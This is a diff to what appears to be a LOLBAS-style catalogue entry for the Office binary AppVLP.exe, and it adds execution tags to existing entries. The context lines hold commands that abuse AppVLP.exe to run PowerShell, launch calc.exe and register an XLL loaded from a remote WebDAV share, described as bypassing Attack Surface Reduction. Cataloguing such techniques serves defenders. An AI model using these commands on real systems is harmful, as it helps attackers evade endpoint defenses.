@@ -11,6 +11,8 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 10 w/Office 2016
+    Tags:
+      - Execute: CMD
   - Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe','', '', 'open', 1)"
     Usecase: Local execution of process bypassing Attack Surface Reduction (ASR).
     Description: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
@@ -18,6 +20,8 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 10 w/Office 2016
+    Tags:
+      - Execute: EXE
   - Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')"
     Usecase: Local execution of process bypassing Attack Surface Reduction (ASR).
     Description: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
@@ -25,6 +29,8 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 10 w/Office 2016
+    Tags:
+      - Execute: EXE
 Full_Path:
   - Path: C:\Program Files\Microsoft Office\root\client\appvlp.exe
   - Path: C:\Program Files (x86)\Microsoft Office\root\client\appvlp.exe
